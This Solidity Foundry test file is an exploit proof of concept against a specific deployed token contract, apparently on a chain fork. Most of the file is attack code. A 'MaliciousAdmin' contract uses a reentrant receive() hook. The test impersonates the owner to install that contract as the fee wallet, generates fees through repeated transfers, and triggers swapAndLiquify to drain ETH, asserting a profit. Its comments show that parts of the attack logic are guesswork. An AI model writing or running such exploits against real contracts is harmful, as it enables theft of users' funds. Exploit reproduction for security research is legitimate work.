// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function owner() external view returns (address);
    function _adminWalletAddress() external view returns (address payable);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MaliciousAdmin {
    IJizzJet public token;
    uint256 public reentrancyDepth = 0;
    uint256 public maxReentrancyDepth = 1;
    bool public isAttacking = false;

    constructor(address _token) {
        token = IJizzJet(_token);
    }

    function setReentrancyDepth(uint256 depth) external {
        maxReentrancyDepth = depth;
    }

    function triggerAttack() external {
        // Transfer tokens to trigger swapAndLiquify
        // We need to transfer from a non-pair address when contract has enough tokens
        // We'll transfer to ourselves to generate fees
        uint256 myBalance = token.balanceOf(address(this));
        if (myBalance > 0) {
            isAttacking = true;
            token.transfer(address(this), myBalance / 2);
            isAttacking = false;
        }
    }

    receive() external payable {
        // Reentrancy point - called when token contract sends us ETH
        if (isAttacking && reentrancyDepth < maxReentrancyDepth) {
            reentrancyDepth++;

            // Try to drain more ETH by calling transfer on the token contract
            // We need to call a function that will send us more ETH
            // The token contract has ETH from the swap, we can try to trigger another transfer

            // We can't directly call sendBNBToAdmin as it's private
            // Instead, we can try to trigger another swapAndLiquify
            // But we're in the middle of one, so we need a different approach

            // One approach: call transfer on the token to generate more fees
            // This might trigger another swapAndLiquify if conditions are met
            if (token.balanceOf(address(this)) > 0) {
                token.transfer(address(this), 1);
            }

            reentrancyDepth--;
        }
    }

    // Fallback function for safety
    fallback() external payable {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create interface for the token
        IJizzJet token = IJizzJet(TARGET);

        // Deploy malicious admin contract
        MaliciousAdmin maliciousAdmin = new MaliciousAdmin(TARGET);

        // Label addresses for debugging
        vm.label(address(maliciousAdmin), "MaliciousAdmin");
        vm.label(TARGET, "JizzJet Token");

        // Get owner address (needed to impersonate)
        address owner = token.owner();
        vm.label(owner, "Owner");

        // Impersonate owner to set our malicious contract as admin wallet
        vm.startPrank(owner);
        token._setReceiverWallet(payable(address(maliciousAdmin)));
        vm.stopPrank();

        // Give attacker some initial ETH for transactions
        deal(attacker, 100 ether);

        // Get some JizzJet tokens for the attacker
        // First, we need to buy from Uniswap
        // We'll need the router address (0x10ED43C718714eb63d5aA57B78B54704E256024E)
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);

        // Get WETH address
        address weth = router.WETH();

        // Give attacker WETH to buy tokens
        deal(weth, attacker, 10 ether);

        // Approve router to spend WETH
        vm.prank(attacker);
        IERC20(weth).approve(routerAddress, type(uint256).max);

        // Buy JizzJet tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Approve token transfers for the attacker
        vm.prank(attacker);
        token.approve(address(maliciousAdmin), type(uint256).max);

        // Transfer some tokens to malicious admin so it can trigger transfers
        uint256 attackerBalance = token.balanceOf(attacker);
        vm.prank(attacker);
        token.transfer(address(maliciousAdmin), attackerBalance / 2);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // First, we need to accumulate tokens in the contract to trigger swapAndLiquify
        // The contract needs at least numTokensSellToAddToLiquidity tokens
        // We'll make multiple transfers to generate fees
        IJizzJet token = IJizzJet(TARGET);
        MaliciousAdmin maliciousAdmin = MaliciousAdmin(token._adminWalletAddress());

        // Get the threshold for swapAndLiquify
        uint256 swapThreshold = 100000000 * 10**1 * 10**9; // From contract: numTokensSellToAddToLiquidity

        console.log("Swap threshold:", swapThreshold);
        console.log("Contract token balance before:", token.balanceOf(TARGET));

        // If contract doesn't have enough tokens, we need to generate more fees
        // We'll make transfers between accounts to generate fees
        address dummy = address(0x123);
        deal(dummy, 1 ether);

        // Give dummy some tokens first
        vm.prank(attacker);
        token.transfer(dummy, token.balanceOf(attacker) / 2);

        // Make multiple transfers to accumulate fees in contract
        // Each transfer generates 8% fee (7% tax + 1% liquidity)
        for (uint i = 0; i < 10; i++) {
            vm.prank(dummy);
            token.transfer(attacker, token.balanceOf(dummy) / 10);

            vm.prank(attacker);
            token.transfer(dummy, token.balanceOf(attacker) / 10);
        }

        console.log("Contract token balance after transfers:", token.balanceOf(TARGET));

        // Now trigger swapAndLiquify by making a transfer from a non-pair address
        // The malicious admin will trigger this
        uint256 initialEthBalance = address(maliciousAdmin).balance;
        console.log("Malicious admin ETH balance before:", initialEthBalance);

        // Set reentrancy depth in malicious admin
        maliciousAdmin.setReentrancyDepth(3);

        // Trigger the attack by having malicious admin transfer tokens
        // This should trigger swapAndLiquify since contract has enough tokens
        maliciousAdmin.triggerAttack();

        // Check results
        uint256 finalEthBalance = address(maliciousAdmin).balance;
        console.log("Malicious admin ETH balance after:", finalEthBalance);
        console.log("Profit:", finalEthBalance - initialEthBalance);

        // Verify attack succeeded
        assertGt(finalEthBalance, initialEthBalance, "Attack should increase ETH balance");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
